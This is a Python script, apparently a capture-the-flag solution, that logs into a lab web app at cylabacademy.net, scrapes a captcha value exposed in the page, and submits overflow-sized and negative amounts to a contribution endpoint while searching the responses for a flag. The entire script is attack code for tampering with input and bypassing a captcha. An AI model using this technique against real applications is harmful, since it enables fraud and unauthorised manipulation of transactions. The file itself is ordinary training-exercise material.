import sys, requests, urllib3, re, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://chatelaine.cylabacademy.net:19299/"
s = requests.Session()
s.post(BASE + "register.php", data={"user": "whale42", "pass": "pass42"}, timeout=15)
s.post(BASE + "index.php", data={"username": "whale42", "password": "pass42"}, timeout=15)
amounts = ["1000000", "1000000000", "-1000000", "99999999999999999999", "1e10", "0",
           "9223372036854775807", "-9223372036854775808"]
for amt in amounts:
    r = s.get(BASE + "index.php", timeout=15)
    cap = re.search(r'name="captcha" value="([^"]+)"', r.text)
    if not cap:
        print("pas de captcha (page %d octets)" % len(r.text))
        continue
    r2 = s.post(BASE + "contribute.php", data={"captcha": cap.group(1), "moneys": amt}, timeout=15)
    m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r2.text)
    txt = re.sub(r"<[^>]+>", " ", r2.text)
    txt = re.sub(r"\s+", " ", txt)
    print("captcha=%-6s montant=%-22s -> %d | %s" % (cap.group(1), amt, len(r2.text),
          ("FLAG " + m.group(0)) if m else txt[:130]))
    if m:
        break
    time.sleep(0.3)
